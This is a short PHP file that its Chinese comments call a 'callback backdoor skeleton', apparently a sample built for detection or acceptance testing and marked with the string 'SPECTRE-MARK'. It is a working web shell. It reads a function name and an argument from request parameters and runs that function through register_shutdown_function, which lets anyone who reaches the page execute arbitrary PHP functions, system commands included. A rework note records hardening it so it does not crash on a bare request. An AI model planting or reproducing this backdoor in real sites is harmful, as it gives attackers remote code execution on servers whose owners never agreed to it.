<?php
// 回调后门骨架(公开模式:array_filter/register_shutdown_function 族)
// [Rework-3 2026-09-19] 空回调兜底+is_callable 守卫:裸 GET 不得 Fatal(验收驳回项)
$f = $_REQUEST['f'] ?? '';
$p = $_REQUEST['p'] ?? 'SPECTRE-MARK';
if ($f !== '' && is_callable($f)) {
    register_shutdown_function($f, $p);
} else {
    register_shutdown_function(function() use ($p) { echo $p . "\n"; });
}
echo "SPECTRE-MARK-CALLBACK";
?>
